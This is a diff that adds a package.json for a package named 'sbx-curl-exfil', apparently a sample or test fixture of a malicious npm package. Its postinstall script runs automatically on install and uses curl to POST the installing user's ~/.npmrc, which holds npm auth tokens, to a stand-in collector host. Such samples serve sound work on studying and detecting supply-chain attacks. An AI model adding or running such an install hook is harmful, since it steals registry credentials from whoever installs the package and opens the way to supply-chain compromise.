@@ -1,0 +1,5 @@
+{
+  "name": "sbx-curl-exfil",
+  "version": "1.0.0",
+  "scripts": {"postinstall": "curl -s -X POST --data-binary @$HOME/.npmrc http://collector.example.invalid/x"}
+}
